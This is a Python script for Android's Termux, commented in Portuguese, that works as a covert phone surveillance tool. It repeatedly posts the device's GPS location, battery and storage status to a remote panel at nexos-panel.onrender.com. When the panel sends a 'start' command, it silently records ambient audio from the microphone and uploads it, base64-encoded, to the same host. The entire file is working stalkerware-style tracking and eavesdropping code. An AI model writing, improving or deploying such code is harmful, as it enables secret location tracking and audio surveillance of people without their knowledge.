import time
import subprocess
import json
import requests
import os
import uuid
import base64

URL_SERVIDOR = "https://nexos-panel.onrender.com/update"
URL_UPLOAD_AUDIO = "https://nexos-panel.onrender.com/api/upload_audio"
ARQUIVO_ID = os.path.expanduser("~/.nexos_device_id")
ARQUIVO_AUDIO = os.path.expanduser("~/nexos_escuta.mp3")

def run_command(cmd):
    try: return subprocess.check_output(cmd, shell=True).decode().strip()
    except: return ""

def obter_ou_criar_id_unico():
    if os.path.exists(ARQUIVO_ID):
        with open(ARQUIVO_ID, "r") as f: return f.read().strip()
    novo_id = f"NX-{str(uuid.uuid4())[:6].upper()}"
    with open(ARQUIVO_ID, "w") as f: f.write(novo_id)
    return novo_id

DEVICE_ID = obter_ou_criar_id_unico()

print("\n" + "="*45)
print(f"🛰️  MOTOR NEXOS AUDIO & GPS OPERACIONAL")
print(f"🔑  SEU MONITOR ID DE PROD: {DEVICE_ID}")
print("="*45 + "\n")

ultima_lat_valida = -16.6869
ultima_lon_valida = -49.2648
headers_json = {"Content-Type": "application/json"}

while True:
    # 1. Coleta dados de Bateria
    battery = "N/A"
    out_bat = run_command("termux-battery-status")
    if out_bat:
        try: battery = str(json.loads(out_bat).get("percentage", "N/A"))
        except: pass
        
    # 2. Coleta dados de Armazenamento
    storage = "N/A"
    out_df = run_command("df -h /data/data/com.termux/files/home")
    if out_df:
        try:
            lines = out_df.split("\n")
            if len(lines) > 1:
                parts = [p for p in lines[1].split(" ") if p]
                if len(parts) >= 3: storage = f"{parts[3]} livres"
        except: pass

    # 3. Coleta Localização GPS
    lat, lon = ultima_lat_valida, ultima_lon_valida
    out_loc = run_command("termux-location -p gps -r once")
    if out_loc:
        try:
            loc_data = json.loads(out_loc)
            if loc_data.get("latitude") and loc_data.get("longitude"):
                lat = loc_data.get("latitude")
                lon = loc_data.get("longitude")
                ultima_lat_valida = lat
                ultima_lon_valida = lon
        except: pass

    # 4. Monta o Envio e Recebe a Ordem do Botão do Site
    payload = {
        "device_id": DEVICE_ID,
        "battery": battery,
        "storage": storage,
        "uptime": "Ativo",
        "lat": lat,
        "lon": lon
    }

    try:
        response = requests.post(URL_SERVIDOR, data=json.dumps(payload), headers=headers_json, timeout=5)
        if response.status_code == 200:
            res_data = response.json()
            comando_audio = res_data.get("comando", "stop")
            print(f"🛰️ [OK] GPS Sincronizado. Status Escuta: {comando_audio.upper()}")
            
            # SE O SITE MANDOU 'START', O CELULAR GRAVA E TRANSMITE SEGREDO
            if comando_audio == "start":
                print("🎙️ [AÇÃO] Capturando 3 segundos de áudio ambiente...")
                # Deleta cache antigo antes de gravar
                if os.path.exists(ARQUIVO_AUDIO): os.remove(ARQUIVO_AUDIO)
                
                # Executa o microfone via Termux:API de forma silenciosa
                run_command(f"termux-audio-record -d 3 {ARQUIVO_AUDIO}")
                time.sleep(3.2) # Espera a gravação terminar
                
                if os.path.exists(ARQUIVO_AUDIO) and os.path.getsize(ARQUIVO_AUDIO) > 0:
                    with open(ARQUIVO_AUDIO, "rb") as audio_file:
                        audio_b64 = base64.b64encode(audio_file.read()).decode('utf-8')
                    
                    # Dispara o arquivo de som para o site
                    payload_audio = {"device_id": DEVICE_ID, "audio": audio_b64}
                    requests.post(URL_UPLOAD_AUDIO, data=json.dumps(payload_audio), headers=headers_json, timeout=5)
                    print("🚀 [OK] Lote de áudio transmitido para o painel!")
                    
    except Exception as e:
        print(f"❌ Falha de comunicacao: {e}")

    time.sleep(2.0)
